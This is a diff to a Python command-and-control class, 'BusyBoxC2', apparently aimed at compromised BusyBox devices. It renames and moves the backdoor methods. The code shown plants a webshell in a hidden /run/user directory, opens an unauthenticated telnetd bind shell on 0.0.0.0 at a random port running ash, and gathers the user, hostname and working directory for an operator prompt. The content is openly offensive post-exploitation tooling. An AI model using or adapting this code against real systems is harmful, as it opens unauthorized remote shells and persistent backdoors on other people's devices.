@@ -149,7 +149,7 @@ class BusyBoxC2:
         os.system(local_cmd)
 
     
-    def _install_webshell(self):
+    def _backdoor_webshell(self):
 
         # Webshell destination path
         webshell_destination_path = "/run/user/$(id -u)/.http/"
@@ -172,18 +172,18 @@ class BusyBoxC2:
         self._send_cmd(cmd)
         print(f"[*] Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")
 
+    def _backdoor_telnet(self):
+        listening_port = random.randint(1024, 65534)
+        cmd = "telnetd -b 0.0.0.0:" + str(listening_port) + " -l ash"
+        self._send_cmd(cmd)
+        print(f"[*] Your telnet backdoor is ready on telnet://{self.server_ip}:{listening_port}")
+
     def _load_prompt(self):
         agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
         agent_hostname = self._send_cmd("hostname", output=False)[0].decode().split("\n", 1)[0]
         agent_pwd = self._send_cmd("echo $PWD", output=False)[0].decode().split("\n", 1)[0]
 
         self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "
-
-    def _telnet_backdoor(self):
-        listening_port = random.randint(1024, 65534)
-        cmd = "telnetd -b 0.0.0.0:" + str(listening_port) + " -l ash"
-        self._send_cmd(cmd)
-        print(f"[*] Your telnet backdoor is ready on telnet://{self.server_ip}:{listening_port}")
 
     def run(self):
         try:
@@ -212,11 +212,11 @@ class BusyBoxC2:
                             self._download()
                         case '/upload':
                             self._upload()
-                        case '/install_webshell':
+                        case '/backdoor_webshell':
                             # work only without obfuscation
-                            self._install_webshell()
-                        case '/telnet_backdoor':
-                            self._telnet_backdoor()
+                            self._backdoor_webshell()
+                        case '/backdoor_telnet':
+                            self._backdoor_telnet()
                         case '/load_prompt':
                             self.options.append('load_prompt')
                             self._load_prompt()
